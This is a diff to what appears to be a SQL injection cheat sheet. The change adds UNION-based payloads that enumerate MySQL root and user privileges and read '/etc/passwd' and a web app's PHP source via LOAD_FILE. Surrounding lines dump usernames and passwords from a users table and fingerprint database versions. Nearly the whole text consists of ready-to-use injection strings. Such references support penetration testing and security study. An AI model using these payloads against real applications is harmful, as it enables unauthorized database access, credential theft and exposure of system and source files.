@@ -193,7 +193,7 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2    --- Basic usage, must b
 ' UNION SELECT 1,2--
 ' UNION SELECT 1,2,3--
 ' UNION SELECT 1,2,3,4--
-' UNION SELECT NULL FROM DUAL--            Oracle specific, SELECT must use FROM query
+' UNION SELECT NULL FROM DUAL--            --- Oracle specific, SELECT must use FROM query
 
 --- Location of injection matters
 ' UNION SELECT NULL,@@version,NULL,NULL--
@@ -215,6 +215,15 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2    --- Basic usage, must b
 SELECT LOAD_FILE('/etc/passwd')
 -1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
 ' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
+
+'--- Privilege Enumeration
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+
+'--- LOAD_FILE
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -               --- May need to check page source
 ```
 
 ### NON-ORACLE
